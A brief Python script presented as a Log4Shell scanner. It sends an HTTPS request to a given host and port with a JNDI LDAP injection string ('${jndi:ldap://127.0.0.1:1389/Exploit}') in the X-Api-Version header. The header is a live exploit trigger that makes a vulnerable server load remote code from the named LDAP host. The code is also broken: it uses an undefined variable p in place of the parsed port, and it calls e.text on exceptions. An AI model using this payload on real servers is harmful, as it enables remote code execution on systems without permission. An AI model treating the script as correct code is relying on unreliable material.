#!/bin/python3
# log4shell_scanner.py <ip adrr> <port>

import sys
import requests

rhost = sys.argv[1]
rport = sys.argv[2]

s = requests.Session()
s.headers = {'X-Api-Version': '${jndi:ldap://127.0.0.1:1389/Exploit}'}
try:
    print(f"probing {rhost}:{p}...")
    r = s.get(f"https://{rhost}:{p}", verify=False, timeout=1)
    print(r.text)
except Exception as e:
    print (e.text)

s.close()